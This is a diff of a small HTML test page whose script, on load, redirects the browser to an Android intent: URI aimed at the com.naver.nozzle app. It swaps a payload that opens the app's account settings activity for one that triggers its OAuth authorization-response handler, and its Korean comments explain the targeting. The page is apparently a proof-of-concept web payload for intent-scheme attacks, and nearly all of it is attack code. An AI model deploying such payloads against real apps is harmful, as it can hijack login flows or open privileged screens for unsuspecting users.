@@ -5,14 +5,15 @@
     <h1>Hellllooooo!!!</h1>
     
     <script>
-    window.onload = function() {
-        var payload = "intent:#Intent;action=android.intent.action.MAIN;" +
-                  "category=android.intent.category.DEFAULT;" +
-                  "component=com.naver.nozzle/com.naver.nozzle.setting.account.AccountSettingsActivity;" +
-                  "package=com.naver.nozzle;end";
-    
+        // 1. 매니페스트에 명시된 특정 액션을 타겟팅
+        // 2. package를 강제하여 클로바 앱 내부에서 핸들러를 찾게 함
+        var payload = "intent:#Intent;" +
+                      "action=com.naver.nozzle.appauth.HANDLE_AUTHORIZATION_RESPONSE;" +
+                      "category=android.intent.category.DEFAULT;" +
+                      "category=android.intent.category.BROWSABLE;" +
+                      "package=com.naver.nozzle;" +
+                      "end";
         location.href = payload;
-    };
-</script>
+    </script>
 </body>
 </html>
